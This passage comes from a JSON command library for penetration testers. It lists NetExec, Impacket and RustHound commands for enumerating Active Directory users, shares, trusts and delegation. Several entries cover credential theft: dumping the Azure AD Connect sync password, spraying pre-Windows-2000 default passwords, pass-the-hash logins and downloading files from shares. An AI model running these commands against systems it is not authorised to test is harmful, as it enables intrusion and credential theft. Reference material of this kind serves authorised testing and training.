      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate DNS zones and records stored in Active Directory via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "dns",
        "zones",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M enum_dns"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M enum_dns"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M enum_dns"
      ]
    },
    {
      "id": "nxc-ldap-subnets",
      "name": "NetExec LDAP Enumerate Subnets",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M subnets",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate AD Sites and Services subnets from Active Directory",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "subnets",
        "sites",
        "enumeration",
        "network"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M subnets"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M subnets"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M subnets"
      ]
    },
    {
      "id": "nxc-ldap-enum-trusts",
      "name": "NetExec LDAP Enumerate Trusts",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M enum_trusts",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate domain trust relationships via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "trusts",
        "forest",
        "enumeration",
        "domain"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M enum_trusts"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M enum_trusts"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M enum_trusts"
      ]
    },
    {
      "id": "nxc-ldap-find-delegation",
      "name": "NetExec LDAP Find Delegation",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' --find-delegation",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Find all accounts with delegation rights via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "delegation",
        "unconstrained",
        "constrained",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' --find-delegation"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache --find-delegation"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' --find-delegation"
      ]
    },
    {
      "id": "nxc-ldap-maq",
      "name": "NetExec LDAP Machine Account Quota",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M maq",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Check the Machine Account Quota (ms-DS-MachineAccountQuota) for the domain",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "maq",
        "machine-account",
        "quota",
        "enumeration",
        "rbcd"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M maq"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M maq"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M maq"
      ]
    },
    {
      "id": "nxc-ldap-msol",
      "name": "NetExec LDAP MSOL Account",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M msol",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Retrieve the cleartext password of the MSOL (Azure AD Connect) sync account",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "msol",
        "azure-ad-connect",
        "credential-dumping",
        "sync-account"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M msol"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M msol"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'admin' -p 'password' -M msol"
      ]
    },
    {
      "id": "nxc-ldap-ldap-checker",
      "name": "NetExec LDAP Signing Checker",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M ldap-checker",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Check if LDAP signing and channel binding are enforced on the domain controller",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "signing",
        "channel-binding",
        "relay",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M ldap-checker"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M ldap-checker"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M ldap-checker"
      ]
    },
    {
      "id": "nxc-get-desc-users",
      "name": "NetExec LDAP User Descriptions",
      "command": "nxc ldap '<ip>' -d '<domain>' -u '<user>' -p '<password>' -M get-desc-users",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Extract user account descriptions via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "users",
        "description",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -d '<domain>' -u '<user>' -H '<hash>' -M get-desc-users"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -d '<domain>' --use-kcache -M get-desc-users"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -d 'CORP.LOCAL' -u 'user' -p 'password' -M get-desc-users"
      ]
    },
    {
      "id": "nxc-pre2k",
      "name": "NetExec pre2k Module",
      "command": "nxc ldap <dc-ip> -u '<user>' -p '<password>' -M pre2k",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate computer accounts that still use the pre-Windows-2000 compatible access default password (the lowercase computer name without the trailing $). Authenticate to LDAP first to list candidates, then spray. Module lives on the ldap protocol since v1.4. v1.5.1 added support for changing the password on locked pre2k accounts.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "netexec",
        "nxc",
        "pre2k",
        "machine-account",
        "default-credentials"
      ],
      "variations": [
        {
          "label": "Show All Candidates",
          "requires": "password",
          "command": "nxc ldap <dc-ip> -u '<user>' -p '<password>' -M pre2k -o ALL=true"
        }
      ],
      "references": [
        {
          "title": "NetExec pre2k",
          "url": "https://www.netexec.wiki/ldap-protocol/pre2k-authentication"
        },
        {
          "title": "Pre2k attack",
          "url": "https://www.thehacker.recipes/a-d/persistence/dacl/pre-2k-compatible-access"
        }
      ],
      "examples": [
        "nxc ldap dc.corp.local -u jdoe -p 'Password123!' -M pre2k"
      ]
    },
    {
      "id": "rusthound",
      "name": "RustHound BloodHound Collection",
      "command": "rusthound -d '<domain>' -i <ip> -u '<user>@<domain>' -f '<dc_fqdn>' -z --fqdn-resolver",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Collect Active Directory data for BloodHound using RustHound (Kerberos-aware)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "rusthound",
        "bloodhound",
        "enumeration",
        "collection",
        "ad"
      ],
      "variations": [
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "rusthound -d '<domain>' -i <ip> -u '<user>@<domain>' -f '<dc_fqdn>' -k -z --fqdn-resolver"
        }
      ],
      "examples": [
        "rusthound -d 'corp.local' -i 192.168.1.100 -u 'user@corp.local' -f 'dc01.corp.local' -z --fqdn-resolver",
        "rusthound -d 'euvendor.local' -i 192.168.12.212 -u 'administrator@eu.local' -f 'euvendor-dc.euvendor.local' -k -z --fqdn-resolver"
      ]
    },
    {
      "id": "nxc-mssql-enum-impersonate",
      "name": "NetExec MSSQL enum_impersonate",
      "command": "nxc mssql <target> -u '<user>' -p '<password>' -M enum_impersonate",
      "category": "enumeration",
      "subcategory": "mssql",
      "description": "List every login the current user can EXECUTE AS (IMPERSONATE permission). The classic privesc primitive on MSSQL — find a sysadmin you can impersonate, then run mssql_priv to land on xp_cmdshell.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "netexec",
        "nxc",
        "mssql",
        "impersonate",
        "privesc"
      ],
      "examples": [
        "nxc mssql 10.10.10.10 -u lowpriv -p 'Password123!' --local-auth -M enum_impersonate"
      ]
    },
    {
      "id": "nxc-mssql-enum-logins",
      "name": "NetExec MSSQL enum_logins",
      "command": "nxc mssql <target> -u '<user>' -p '<password>' -M enum_logins",
      "category": "enumeration",
      "subcategory": "mssql",
      "description": "List every SQL Server login (built-in sa, Windows-mapped accounts, contained DB users) on the instance. Pair with mssql_priv to spot effective sysadmin paths.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "netexec",
        "nxc",
        "mssql",
        "enumeration"
      ],
      "examples": [
        "nxc mssql 10.10.10.10 -u sa -p 'Password123!' --local-auth -M enum_logins"
      ]
    },
    {
      "id": "nxc-mssql-query",
      "name": "NetExec MSSQL Query",
      "command": "nxc mssql <target> -u '<user>' -p '<password>' -q '<sql-query>'",
      "category": "enumeration",
      "subcategory": "mssql",
      "description": "Run an arbitrary SQL query against MSSQL via NetExec. Faster than firing up impacket-mssqlclient when you only need one statement (e.g. SELECT @@version, SELECT name FROM sys.databases).",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "netexec",
        "nxc",
        "mssql",
        "query"
      ],
      "variations": [
        {
          "label": "Local SQL Auth",
          "requires": "password",
          "command": "nxc mssql <target> -u 'sa' -p '<password>' --local-auth -q '<sql-query>'"
        },
        {
          "label": "Windows Auth",
          "requires": "password",
          "command": "nxc mssql <target> -u '<user>' -p '<password>' --windows-auth -q '<sql-query>'"
        },
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "nxc mssql <target> -u '<user>' -H <nt-hash> -q '<sql-query>'"
        }
      ],
      "examples": [
        "nxc mssql 10.10.10.10 -u sa -p 'Password123!' --local-auth -q 'SELECT @@version'"
      ]
    },
    {
      "id": "impacket-DumpNTLMInfo",
      "name": "Impacket DumpNTLMInfo",
      "command": "impacket-DumpNTLMInfo '<ip>'",
      "category": "enumeration",
      "subcategory": "network",
      "description": "Dump NTLM server information (OS version, domain, hostname) without credentials",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "ntlm",
        "fingerprint",
        "enumeration",
        "unauthenticated"
      ],
      "examples": [
        "impacket-DumpNTLMInfo 192.168.1.100"
      ]
    },
    {
      "id": "impacket-rdp-check",
      "name": "Impacket RDP Check",
      "command": "impacket-rdp_check '<domain>/<user>:<password>'@'<ip>'",
      "category": "enumeration",
      "subcategory": "network",
      "description": "Check if credentials are valid for RDP access",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rdp"
      ],
      "tags": [
        "impacket",
        "rdp",
        "credential-check",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-rdp_check -hashes ':<hash>' '<domain>/<user>'@'<ip>'"
        }
      ],
      "examples": [
        "impacket-rdp_check 'CORP.LOCAL/user:password'@192.168.1.100"
      ]
    },
    {
      "id": "impacket-rpcdump",
      "name": "Impacket RPCDump",
      "command": "impacket-rpcdump '<domain>/<user>:<password>'@'<ip>'",
      "category": "enumeration",
      "subcategory": "network",
      "description": "Enumerate RPC endpoints and interfaces registered on a remote host",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc"
      ],
      "tags": [
        "impacket",
        "rpc",
        "endpoints",
        "enumeration",
        "network"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-rpcdump -hashes ':<hash>' '<domain>/<user>'@'<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-rpcdump -k -no-pass '<domain>/<user>'@'<ip>'"
        }
      ],
      "examples": [
        "impacket-rpcdump 'CORP.LOCAL/user:password'@192.168.1.100"
      ]
    },
    {
      "id": "nxc-rdp-nla-screenshot",
      "name": "NetExec RDP NLA Screenshot",
      "command": "nxc rdp <target> --nla-screenshot",
      "category": "enumeration",
      "subcategory": "network",
      "description": "Capture a pre-auth RDP login screen against hosts that have NLA enabled. Reveals OS branding, last logged-on user, and any logon banners — useful recon without burning credentials.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "rdp"
      ],
      "tags": [
        "netexec",
        "nxc",
        "rdp",
        "screenshot",
        "recon"
      ],
      "variations": [
        {
          "label": "Custom Resolution",
          "requires": "no-creds",
          "command": "nxc rdp <target> --nla-screenshot --res 1920x1080"
        },
        {
          "label": "Custom Port",
          "requires": "no-creds",
          "command": "nxc rdp <target> --port 3390 --nla-screenshot"
        }
      ],
      "examples": [
        "nxc rdp 10.10.10.0/24 --nla-screenshot"
      ]
    },
    {
      "id": "nmap-tcp-scan",
      "name": "Nmap TCP Scan",
      "command": "nmap -sC -sV -p <ports> <ip>",
      "category": "enumeration",
      "subcategory": "network",
      "description": "Comprehensive TCP port scan with service version detection and default scripts",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "protocols": [],
      "tags": [
        "nmap",
        "tcp",
        "scan",
        "ports",
        "discovery"
      ],
      "references": [
        {
          "title": "Nmap Official Documentation",
          "url": "https://nmap.org/book/"
        },
        {
          "title": "HackTricks - Port Scanning",
          "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#tcp-scan"
        }
      ],
      "examples": [
        "nmap -sC -sV -p 1-1000 192.168.1.1",
        "nmap -sC -sV -p- target.com"
      ]
    },
    {
      "id": "nxc-nfs-shares",
      "name": "NetExec NFS Share Enumeration",
      "command": "nxc nfs <ip> --shares",
      "category": "enumeration",
      "subcategory": "nfs",
      "description": "Enumerate exported NFS shares on a host. Combine with --enum-shares to recursively list contents of accessible exports.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "nfs"
      ],
      "tags": [
        "nxc",
        "netexec",
        "nfs",
        "shares",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Recursive Listing",
          "requires": "no-creds",
          "command": "nxc nfs <ip> --enum-shares"
        },
        {
          "label": "Get a File",
          "requires": "no-creds",
          "command": "nxc nfs <ip> --get-file <remote_path> <local_path>"
        }
      ],
      "references": [
        {
          "title": "NetExec — NFS Protocol",
          "url": "https://www.netexec.wiki/nfs-protocol"
        }
      ],
      "examples": [
        "nxc nfs 10.10.10.10 --shares",
        "nxc nfs 10.10.10.10 --enum-shares"
      ]
    },
    {
      "id": "enum4linux-ng",
      "name": "Enum4linux-ng SMB Enumeration",
      "command": "enum4linux-ng -A '<ip>' -u '<user>' -p '<password>' -oJ enum4linux_<ip>",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Next generation enum4linux for SMB enumeration",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "enum4linux",
        "smb",
        "enumeration",
        "shares",
        "users"
      ],
      "variations": [
        {
          "label": "Null Session",
          "requires": "no-creds",
          "command": "enum4linux-ng -A '<ip>' -oJ enum4linux_<ip>"
        }
      ],
      "examples": [
        "enum4linux-ng -A '192.168.1.100' -u 'guest' -p '' -oJ enum4linux_192.168.1.100"
      ]
    },
    {
      "id": "impacket-lookupsid",
      "name": "Impacket lookupsid",
      "command": "impacket-lookupsid '<domain>/<user>:<password>@<target>'",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Brute-force the RID space against SAMR / LSARPC to enumerate domain users, groups, and SIDs from a low-priv account. Works against domain controllers and member servers; output is a clean SID → name mapping.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "lookupsid",
        "enumeration",
        "rid"
      ],
      "variations": [
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "impacket-lookupsid '<domain>/<user>@<target>' -hashes :<nt-hash>"
        },
        {
          "label": "Higher RID Range",
          "requires": "password",
          "command": "impacket-lookupsid '<domain>/<user>:<password>@<target>' 10000"
        },
        {
          "label": "Null Session",
          "requires": "no-creds",
          "command": "impacket-lookupsid '@<target>'"
        }
      ],
      "examples": [
        "impacket-lookupsid 'corp.local/jdoe:Password123!@10.10.10.10' 4000"
      ]
    },
    {
      "id": "impacket-netview",
      "name": "Impacket NetView",
      "command": "impacket-netview '<domain>/<user>:<password>' -target '<ip>'",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate logged-on users and sessions on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "netview",
        "sessions",
        "logged-on",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-netview -hashes ':<hash>' '<domain>/<user>' -target '<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-netview -k -no-pass '<domain>/<user>' -target '<ip>'"
        }
      ],
      "examples": [
        "impacket-netview 'CORP.LOCAL/user:password' -target 192.168.1.100"
      ]
    },
    {
      "id": "impacket-samrdump",
      "name": "Impacket SAMRDump",
      "command": "impacket-samrdump '<domain>/<user>:<password>'@'<ip>'",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Dump user accounts and group information via SAMR protocol",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "samr",
        "users",
        "enumeration",
        "smb"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-samrdump -hashes ':<hash>' '<domain>/<user>'@'<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-samrdump -k -no-pass '<domain>/<user>'@'<ip>'"
        }
      ],
      "examples": [
        "impacket-samrdump 'CORP.LOCAL/user:password'@192.168.1.100"
      ]
    },
    {
      "id": "impacket-smbclient",
      "name": "Impacket SMBClient",
      "command": "impacket-smbclient '<domain>/<user>:<password>@<ip>'",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Interactive SMB client written in pure Python. Drops you into a shell with shares, ls, get, put, mkdir, rm, lcd, etc. Handy when the system smbclient is acting up with NTLMv2 / signing.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "smbclient",
        "smb",
        "shares",
        "interactive"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-smbclient -hashes ':<hash>' '<domain>/<user>@<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-smbclient -k -no-pass '<domain>/<user>@<hostname>'"
        },
        {
          "label": "Null Session",
          "requires": "no-creds",
          "command": "impacket-smbclient '<ip>'"
        }
      ],
      "references": [
        {
          "title": "Impacket — smbclient.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/smbclient.py"
        }
      ],
      "examples": [
        "impacket-smbclient 'CORP/jdoe:Password123!@10.10.10.10'",
        "impacket-smbclient -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/admin@10.10.10.10'"
      ]
    },
    {
      "id": "nxc-enum-ca",
      "name": "NetExec enum_ca Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M enum_ca",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Discover Active Directory Certificate Services CA hosts on the network and grab basic CA information (name, accessible templates, web enrollment endpoint). Quick triage before pivoting to certipy for the heavy lifting.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "enum_ca",
        "adcs",
        "discovery"
      ],
      "examples": [
        "nxc smb 10.10.10.0/24 -u jdoe -p 'Password123!' -M enum_ca"
      ]
    },
    {
      "id": "nxc-ms17-010",
      "name": "NetExec MS17-010 Check (EternalBlue)",
      "command": "nxc smb <target> -u '' -p '' -M ms17-010",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Detect MS17-010 (EternalBlue) vulnerable hosts via the SMBv1 transaction probe. Safe scan only — exploitation is left to dedicated tooling.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "ms17-010",
        "eternalblue",
        "vulnerability-check"
      ],
      "references": [
        {
          "title": "MS17-010",
          "url": "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.0/24 -u '' -p '' -M ms17-010"
      ]
    },
    {
      "id": "password-policy",
      "name": "NetExec Password Policy",
      "command": "nxc smb <IP> -u '<user>' -p '<password>' --pass-pol",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate Domain Password Policy",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "password-policy",
        "enumeration"
      ],
      "examples": [
        "nxc smb 10.10.11.2 -u 'reddington' -p 'LizKeen' --pass-pol"
      ]
    },
    {
      "id": "nxc-smb-enum-av",
      "name": "NetExec SMB Enumerate AV",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M enum_av",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate installed antivirus and security products on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "antivirus",
        "edr",
        "enumeration",
        "enum_av"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M enum_av"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M enum_av"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u 'user' -p 'password' -M enum_av"
      ]
    },
    {
      "id": "nxc-smb-groups",
      "name": "NetExec SMB Enumerate Groups",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --groups",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate domain groups via SMB",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "groups",
        "enumeration",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --groups"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache --groups"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' --groups"
      ]
    },
    {
      "id": "nxc-smb-users",
      "name": "NetExec SMB Enumerate Users",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --users",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate domain users via SMB",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "users",
        "enumeration",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --users"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache --users"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' --users"
      ]
    },
    {
      "id": "nxc-smb-get-network",
      "name": "NetExec SMB Get Network",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M get-network",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Retrieve network interface and configuration information from remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "network",
        "interfaces",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M get-network"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M get-network"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u 'user' -p 'password' -M get-network"
      ]
    },
    {
      "id": "nxc-smb-logged-on-users",
      "name": "NetExec SMB Logged-On Users",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --loggedon-users",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate currently logged-on users on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "logged-on",
        "sessions",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --loggedon-users"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache --loggedon-users"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u 'user' -p 'password' --loggedon-users"
      ]
    },
    {
      "id": "nxc-smb-runasppl",
      "name": "NetExec SMB RunAsPPL Check",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M runasppl",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Check if LSA Protection (RunAsPPL) is enabled on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "lsa-protection",
        "ppl",
        "enumeration",
        "credential-guard"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M runasppl"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M runasppl"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u 'user' -p 'password' -M runasppl"
      ]
    },
    {
      "id": "nxc-smb-shares",
      "name": "NetExec SMB Shares",
      "command": "nxc smb ips.txt -u '<user>' -p '<password>' --shares",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate SMB shares",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "shares",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb ips.txt -u '<user>' -H '<hash>' --shares"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb ips.txt --use-kcache --shares"
        },
        {
          "label": "Null Session",
          "requires": "no-creds",
          "command": "nxc smb ips.txt -u '' -p '' --shares"
        }
      ],
      "examples": [
        "nxc smb 10.10.11.2 -u 'reddington' -p 'LizKeen' --shares"
      ]
    },
    {
      "id": "nxc-smb-spider",
      "name": "NetExec SMB Spider",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=True",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Spider SMB shares for files and optionally download them",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "spider",
        "file-search",
        "shares"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M spider_plus -o DOWNLOAD_FLAG=True"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' --use-kcache -M spider_plus -o DOWNLOAD_FLAG=True"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True"
      ]
    },
    {
      "id": "nxc-smb-uac",
      "name": "NetExec SMB UAC Status",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M uac",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Check UAC (User Account Control) configuration on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
